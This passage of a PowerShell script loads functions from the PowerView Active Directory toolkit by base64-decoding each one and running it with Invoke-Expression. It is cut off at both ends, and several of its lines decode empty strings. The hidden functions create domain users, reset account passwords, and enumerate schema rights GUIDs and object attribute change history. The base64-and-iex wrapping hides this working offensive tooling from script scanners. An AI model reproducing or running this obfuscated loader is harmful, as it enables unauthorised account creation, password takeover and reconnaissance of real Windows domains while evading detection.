KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZXNjcmlwdGlvbiddKSB7CiAgICAgICAgICAgICRVc2VyLkRlc2NyaXB0aW9uID0gJERlc2NyaXB0aW9uCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctRG9tYWluVXNlcl0gQXR0ZW1wdGluZyB0byBjcmVhdGUgdXNlciAnJFNhbUFjY291bnROYW1lJyIKICAgICAgICB0cnkgewogICAgICAgICAgICAkTnVsbCA9ICRVc2VyLlNhdmUoKQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LURvbWFpblVzZXJdIFVzZXIgJyRTYW1BY2NvdW50TmFtZScgc3VjY2Vzc2Z1bGx5IGNyZWF0ZWQiCiAgICAgICAgICAgICRVc2VyCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW05ldy1Eb21haW5Vc2VyXSBFcnJvciBjcmVhdGluZyB1c2VyICckU2FtQWNjb3VudE5hbWUnIDogJF8iCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LURvbWFpblVzZXJQYXNzd29yZCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VTaG91bGRQcm9jZXNzRm9yU3RhdGVDaGFuZ2luZ0Z1bmN0aW9ucycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1VzZXJOYW1lJywgJ1VzZXJJZGVudGl0eScsICdVc2VyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1Bhc3N3b3JkJyldCiAgICAgICAgW1NlY3VyaXR5LlNlY3VyZVN0cmluZ10KICAgICAgICAkQWNjb3VudFBhc3N3b3JkLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJENvbnRleHRBcmd1bWVudHMgPSBAeyAnSWRlbnRpdHknID0gJElkZW50aXR5IH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICBpZiAoJENvbnRleHQpIHsKICAgICAgICAkVXNlciA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRDb250ZXh0LkNvbnRleHQsICRJZGVudGl0eSkKICAgICAgICBpZiAoJFVzZXIpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIEF0dGVtcHRpbmcgdG8gc2V0IHRoZSBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5JyIKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRUZW1wQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ2EnLCAkQWNjb3VudFBhc3N3b3JkKQogICAgICAgICAgICAgICAgJFVzZXIuU2V0UGFzc3dvcmQoJFRlbXBDcmVkLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRVc2VyLlNhdmUoKQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIHN1Y2Nlc3NmdWxseSByZXNldCIKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gRXJyb3Igc2V0dGluZyBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5JyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gVW5hYmxlIHRvIGZpbmQgdXNlciAnJElkZW50aXR5JyIKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdVSURNYXAgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICAkR1VJRHMgPSBAeycwMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAnID0gJ0FsbCd9CiAgICAkRm9yZXN0QXJndW1lbnRzID0gQHt9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEZvcmVzdEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgdHJ5IHsKICAgICAgICAkU2NoZW1hUGF0aCA9IChHZXQtRm9yZXN0IEBGb3Jlc3RBcmd1bWVudHMpLnNjaGVtYS5uYW1lCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgdGhyb3cgJ1tHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gcmV0cmlldmluZyBmb3Jlc3Qgc2NoZW1hIHBhdGggZnJvbSBHZXQtRm9yZXN0JwogICAgfQogICAgaWYgKC1ub3QgJFNjaGVtYVBhdGgpIHsKICAgICAgICB0aHJvdyAnW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3QnCiAgICB9CiAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICdTZWFyY2hCYXNlJyA9ICRTY2hlbWFQYXRoCiAgICAgICAgJ0xEQVBGaWx0ZXInID0gJyhzY2hlbWFJREdVSUQ9KiknCiAgICB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkU2NoZW1hU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICBpZiAoJFNjaGVtYVNlYXJjaGVyKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJFJlc3VsdHMgPSAkU2NoZW1hU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1VJRHNbKE5ldy1PYmplY3QgR3VpZCAoLCRfLnByb3BlcnRpZXMuc2NoZW1haWRndWlkWzBdKSkuR3VpZF0gPSAkXy5wcm9wZXJ0aWVzLm5hbWVbMF0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkU2NoZW1hU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiBidWlsZGluZyBHVUlEIG1hcDogJF8iCiAgICAgICAgfQogICAgfQogICAgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2NoZW1hUGF0aC5yZXBsYWNlKCdTY2hlbWEnLCdFeHRlbmRlZC1SaWdodHMnKQogICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKG9iamVjdENsYXNzPWNvbnRyb2xBY2Nlc3NSaWdodCknCiAgICAkUmlnaHRzU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICBpZiAoJFJpZ2h0c1NlYXJjaGVyKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJFJlc3VsdHMgPSAkUmlnaHRzU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAkR1VJRHNbJF8ucHJvcGVydGllcy5yaWdodHNndWlkWzBdLnRvU3RyaW5nKCldID0gJF8ucHJvcGVydGllcy5uYW1lWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFJpZ2h0c1NlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1VJRE1hcF0gRXJyb3IgaW4gYnVpbGRpbmcgR1VJRCBtYXA6ICRfIgogICAgICAgIH0KICAgIH0KICAgICRHVUlEcwp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdEF0dHJpYnV0ZUhpc3RvcnkgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQURPYmplY3RBdHRyaWJ1dGVIaXN0b3J5JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnICAgID0gICAnbXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGEnLCdkaXN0aW5ndWlzaGVkbmFtZScKICAgICAgICAgICAgJ1JhdycgICAgICAgICAgID0gICAkVHJ1ZQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJExEQVBGaWx0ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0ZpbmRPbmUnXSA9ICRGaW5kT25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7CiAgICAgICAgICAgICRQcm9wZXJ0eUZpbHRlciA9ICRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddIC1Kb2luICd8JwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFByb3BlcnR5RmlsdGVyID0gJycKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CiAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICRPYmplY3RETiA9ICRfLlByb3BlcnRpZXNbJ2Rpc3Rpbmd1aXNoZWRuYW1lJ11bMF0KICAgICAgICAgICAgRm9yRWFjaCgkWE1MTm9kZSBpbiAkXy5Qcm9wZXJ0aWVzWydtc2RzLXJlcGxhdHRyaWJ1dGVtZXRhZGF0YSddKSB7CiAgICAgICAgICAgICAgICAkVGVtcE9iamVjdCA9IFt4bWxdJFhNTE5vZGUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSAnRFNfUkVQTF9BVFRSX01FVEFfREFUQScgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdCkgewogICAgICAgICAgICAgICAgICAgIGlmICgkVGVtcE9iamVjdC5wc3pBdHRyaWJ1dGVOYW1lIC1NYXRjaCAkUHJvcGVydHlGaWx0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RETicgJE9iamVjdEROCiAgICAgICAgICAgICAgICAgICAgICAgICRPdXRwdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQXR0cmlidXRlTmFtZScgJFRlbXBPYmplY3QucHN6QXR0cmlidXRlTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkT3V0cHV0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ0xhc3RPcmlnaW5hdGluZ0NoYW5nZScgJFRlbXBPYmplY3QuZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2UKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdWZXJzaW9uJyAkVGVtcE9iamVjdC5kd1ZlcnNpb24KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdMYXN0T3JpZ2luYXRpbmdEc2FETicgJFRlbXBPYmplY3QucHN6TGFzdE9yaWdpbmF0aW5nRHNhRE4KICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQURPYmplY3RBdHRyaWJ1dGVIaXN0b3J5JykKICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0QXR0cmlidXRlSGlzdG9yeV0gRXJyb3IgcmV0cmlldmluZyAnbXNkcy1yZXBsYXR0cmlidXRlbWV0YWRhdGEnIGZvciAnJE9iamVjdEROJyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbk9iamVjdExpbmtlZEF0dHJpYnV0ZUhpc3RvcnkgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQURPYmplY3RMaW5rZWRBdHRyaWJ1dGVIaXN0b3J5JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmF3CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnICAgID0gICAnbXNkcy1yZXBsdmFsdWVtZXRhZGF0YScsJ2Rpc3Rpbmd1aXNoZWRuYW1lJwogICAgICAgICAgICAnUmF3JyAgICAgICAgICAgPSAgICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkTERBUEZpbHRlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2Vyd